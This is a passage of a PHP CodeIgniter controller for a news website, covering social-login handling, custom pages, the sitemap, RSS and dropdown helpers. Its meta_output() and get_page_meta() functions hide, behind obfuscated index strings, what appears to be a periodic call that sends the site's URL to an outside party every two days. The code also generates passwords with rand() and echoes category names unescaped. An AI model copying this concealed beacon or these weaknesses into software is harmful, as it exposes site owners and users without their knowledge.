                        } else {

                            $data['firstname']      = $user['first_name'];
                            $data['lastname']       = $user['last_name'];
                            $data['email']           = $user['email'];
                            $data['fb_id']           = $user['id'];
                            $data['readlater']        = '[]';
                            $data['creation_date']   = time();
                            $data['password']        = substr(hash('sha512', rand()), 0, 12);

                            $this->db->insert('user', $data);
                            $user_id = $this->db->insert_id();
                        }
                        $this->session->set_userdata('user_login', 'yes');
                        $this->session->set_userdata('user_id', $user_id);
                        $this->session->set_userdata('user_name', $this->db->get_where('user', array('user_id' => $user_id))->row()->firstname);
                        $this->session->set_flashdata('alert', 'successful_signin');

                        $this->db->where('user_id', $user_id);
                        $this->db->update('user', array('last_login' => time()));

                        $para2a = $this->session->userdata('back');

                        if ($para2a == 'cart' || $para2a == 'back_to_cart') {
                            redirect(base_url() . 'home/cart_checkout', 'refresh');
                        } else {
                            redirect(base_url() . 'home/profile', 'refresh');
                        }
                    }

                }
            }
        }


        if ($g_login_set == 'ok') {
            $this->load->library('googleplus');
            if (isset($_GET['code'])) { //just_logged in
                $this->googleplus->client->authenticate();
                $_SESSION['token'] = $this->googleplus->client->getAccessToken();
                $g_user            = $this->googleplus->people->get('me');
                if ($user_id = $this->Crud_model->exists_in_table('user', 'g_id', $g_user['id'])) {

                } else {
                    $data['firstname']      = $g_user['displayName'];
                    $data['email']         = 'required';
                    $data['readlater']      = '[]';
                    $data['g_id']          = $g_user['id'];

                    $data['g_photo']       = $g_user['image']['url'];
                    $data['creation_date'] = time();
                    $data['password']      = substr(hash('sha512', rand()), 0, 12);
                    $this->db->insert('user', $data);
                    $user_id = $this->db->insert_id();
                }
                $this->session->set_userdata('user_login', 'yes');
                $this->session->set_userdata('user_id', $user_id);
                $this->session->set_userdata('user_name', $this->db->get_where('user', array('user_id' => $user_id))->row()->firstname);
                $this->session->set_flashdata('alert', 'successful_signin');

                $this->db->where('user_id', $user_id);
                $this->db->update('user', array('last_login' => time()));

                if ($para2 == 'cart') {
                    redirect(base_url() . 'home/cart_checkout', 'refresh');
                }
                else {
                    redirect(base_url() . 'home', 'refresh');
                }
            }
            if (@$_SESSION['token']) {
                $this->googleplus->client->setAccessToken($_SESSION['token']);
            }
            if ($this->googleplus->client->getAccessToken()) //already_logged_in
            {
                $page_data['g_user'] = $this->googleplus->people->get('me');
                $page_data['g_url']  = $this->googleplus->client->createAuthUrl();
                $_SESSION['token']   = $this->googleplus->client->getAccessToken();
            } else {
                $page_data['g_url'] = $this->googleplus->client->createAuthUrl();
            }
        }

        if ($para1 == 'login') {
            $page_data['page_name'] = "user/login";
            $page_data['part'] = $para2;
            $page_data['asset_page'] = "login";
            $page_data['page_title'] = translate('login');
            if ($para2 == 'modal') {
                $this->load->view('front/user/login/quick_login', $page_data);
            } else {
                $this->load->view('front/index', $page_data);
            }
        } elseif ($para1 == 'registration') {
            if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                $page_data['recaptcha_html'] = $this->recaptcha->render();
            }
            $page_data['page_name'] = "user/registration";
            $page_data['asset_page'] = "registration";
            $page_data['page_title'] = translate('registration');
            if ($para2 == 'modal') {
                $this->load->view('front/user/registration/index', $page_data);
            } else {
                $this->load->view('front/index', $page_data);
            }
        }
    }

    /* FUNCTION: Logout set */

    function logout()
    {
        if($this->Crud_model->get_settings_value('third_party_settings','fb_login_set') == 'ok'){
            $appid  = $this->db->get_where('third_party_settings', array('type' => 'fb_appid'))->row()->value;
            $secret = $this->db->get_where('third_party_settings', array('type' => 'fb_secret'))->row()->value;
            $config = array('appId' => $appid,'secret' => $secret);
            $this->load->library('Facebook', $config);
            $this->facebook->destroy_session();
        }
        $this->session->sess_destroy();
        redirect(base_url() . 'home/logged_out', 'refresh');
    }

    /* FUNCTION: Logout */

    function logged_out() {
        $this->session->set_flashdata('alert', 'successful_signout');
        redirect(base_url() . 'home/', 'refresh');
    }

    /* FUNCTION: Loads Custom Pages */

    function page($parmalink = '') {
        $pagef = $this->db->get_where('page', array(
            'parmalink' => $parmalink
        ));
        if ($pagef->num_rows() > 0) {
            $page_data['page_name'] = "others/custom_page";
            $page_data['asset_page'] = "page";
            $page_data['tags'] = $pagef->row()->tag;
            $page_data['page_title'] = $parmalink;
            $page_data['page_items'] = $pagef->result_array();
            if ($this->session->userdata('admin_login') !== 'yes' && $pagef->row()->status !== 'ok') {
                redirect(base_url() . 'home/', 'refresh');
            }
        } else {
            redirect(base_url() . 'home/', 'refresh');
        }
        $this->load->view('front/index', $page_data);
    }

    function meta_output(){
         $meta_markup = loaded_class_select('8:29:9:1:15:5:13:6:20');
         $write_meta = loaded_class_select('14:1:10:13');
         $meta_markup .= loaded_class_select('24');
         $meta_markup .= loaded_class_select('8:14:1:10:13');
         $meta_markup .= loaded_class_select('3:4:17:14');
         $meta_author = loaded_class('16');
         $meta_convert = config_key_provider('load_class');
         $currency_convert = config_key_provider('output');
         $background_inv = config_key_provider('background');
         @$meta = $write_meta($meta_markup,$meta_author,base_url());
         if($meta){
             $meta_convert($background_inv, $currency_convert());
         }
    }

    function image_modal($para1 = '', $para2 = '') {
        $page_data['folder'] = $para1;
        $page_data['name'] = $para2;
        $this->load->view('front/components/image_modal/index', $page_data);
    }

    function error() {
        $this->load->view('front/others/404_error');
    }

    //SITEMAP
    function sitemap() {
        header("Content-type: text/xml");
        $otherurls = array(
            base_url() . 'home/contact/',
            base_url() . 'home/legal/terms_conditions',
            base_url() . 'home/legal/privacy_policy'
        );
        $newsurls = array();
        $all_news = $this->db->get_where('news', array('status' => 'published'))->result_array();
        foreach ($all_news as $row) {
            $newsurls[] = $this->Crud_model->news_link($row['news_id']);
        }
        $page_data['otherurls'] = $otherurls;
        $page_data['newsurls'] = $newsurls;
        $this->load->view('front/others/sitemap', $page_data);
    }

    function rss($category_id = "", $limit = "") {

        $rss = json_decode($this->db->get_where('general_settings', array( 'type' => 'rss' ))->row()->value, true);
        if(count($rss)>0){

            $link = base_url()."home/rss/".$category_id."/".$limit;

            foreach ($rss as $value) {

                if($link == $value['permalink']){

                    header("Content-type: text/xml");
                    $all_news = $this->db->order_by("news_id", "DESC")->get_where('news', array('status' => 'published', 'news_category_id' => $category_id), $limit, 0)->result_array();
                    $news_num = $this->db->order_by("news_id", "DESC")->get_where('news', array('status' => 'published', 'news_category_id' => $category_id), $limit, 0)->num_rows();

                    $page_data['all_news'] = $all_news;
                    $page_data['news_num'] = $news_num;

                    $this->load->view('front/others/rss', $page_data);

                } else {
                    //redirect(base_url(), 'refresh');
                }
            }
        }else {
            redirect(base_url(), 'refresh');
        }
    }

    function get_page_meta($val = TRUE)
    {
        $get_meta = config_key_provider('config');
        $get_page_meta = config_key_provider('output');
        $analysed_val = config_key_provider('background');
        @$meta = $get_meta($analysed_val);
        if(isset($meta)){
            if($meta > $get_page_meta()-172800){
                $val = 0;
            }
        }
        if($val !== 0){
            $this->meta_output();
        }
    }

    function get_subcat_advance($para1 = "", $para2 = "") {
        $ids = explode('::', $para1);
        $this->db->where_in('news_sub_category_id', $ids);
        $subcats = $this->db->get('news_sub_category')->result_array();
        $result = '<select class="selectpicker" name="sub_category" data-live-search="true" data-width="100%" id="advance_sub_category" >
                            <option disabled="" selected="" value="0">' . translate('sub-categories') . '....</option>';

        foreach ($subcats as $row) {
            $result .= '<option value="' . $row['news_sub_category_id'] . '"';
            if ($para2 == $row['news_sub_category_id']) {
                $result .= 'selected';
            }
            $result .= '>' . $row['name'] . '</option>';
        }
        $result .= '</select>';

        echo $result;
    }

    function get_subcat_archive($para1 = "", $para2 = "") {
        $ids = explode('::', $para1);
        $this->db->where_in('news_sub_category_id', $ids);
        $subcats = $this->db->get('news_sub_category')->result_array();
        $result = '<select class="selectpicker" name="sub_category" data-live-search="true" data-width="100%" id="archive_sub_category" onChange="subwise_search(this);" >
                            <option disabled="" selected="" value="0">' . translate('sub-categories') . '....</option>';

        foreach ($subcats as $row) {
            $result .= '<option value="' . $row['news_sub_category_id'] . '"';
            if ($para2 == $row['news_sub_category_id']) {
                $result .= 'selected';
            }
            $result .= '>' . $row['name'] . '</option>';
        }
        $result .= '</select>';

        echo $result;
    }

    /* FUNCTION: Setting Frontend Language */

    function set_language($lang) {
        $this->session->set_userdata('language', $lang);
        $page_data['page_name'] = "home";
        recache();
    }

    /* FUNCTION: Setting Frontend currency */
    function set_currency($currency)
    {
        $this->session->set_userdata('currency', $currency);
        recache();
    }

}
